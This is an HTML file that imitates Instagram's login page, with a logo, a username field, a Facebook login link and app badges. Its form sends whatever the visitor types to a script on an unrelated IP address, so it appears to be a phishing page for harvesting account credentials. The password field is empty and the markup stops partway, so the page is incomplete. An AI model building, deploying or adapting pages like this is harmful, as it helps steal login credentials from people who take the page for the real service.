<!DOCTYPE html>

<head>

	<title>Instagram Login Page</title>
	<link rel="stylesheet" href="style1.css">
</head>
<body>

<div class="wrapper">
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="http://www.brandinglosangeles.com/wp-content/uploads/Instagram_logo_2016.svg.png" alt="instagram" style="width: 50px;">
			</div>
            <form action="http://35.154.139.232/cgi-bin/abhinav/insta.py" method="post">
			<div class="form">
				<div class="input_field">
					<input type="text" name="username"placeholder="Phone number, username, or email" class="input">
				</div>
				<div class="input_field">

				</div>
				<input type="submit" value="Log In" class="btn" >
			</div>
            </form>
			<div class="or">
				<div class="line"></div>
				<p>OR</p>
				<div class="line"></div>
			</div>
			<div class="dif">

					<img src="https://tse1.mm.bing.net/th?id=OIP.hGaetDAQWapgIJbIOhPhXwHaHa&pid=Api&P=0&h=180" alt="facebook">
					<p>Log in with Facebook</p>
				</div>
				<div class="forgot">
					<a href="#">Forgot password?</a>
				</div>
			</div>
		</div>
		<div class="signup">
			<p>Don't have an account? <a href="#">Sign up</a></p>
		</div>
		<div class="apps">
			<p>Get the app.</p>
			<div class="icons">
				<a href="#"><img src="https://tse4.mm.bing.net/th?id=OIP.fn_qr7uzdYZfa8zVcFbNYgHaCj&pid=Api&P=0&h=180" alt="appstore"></a>
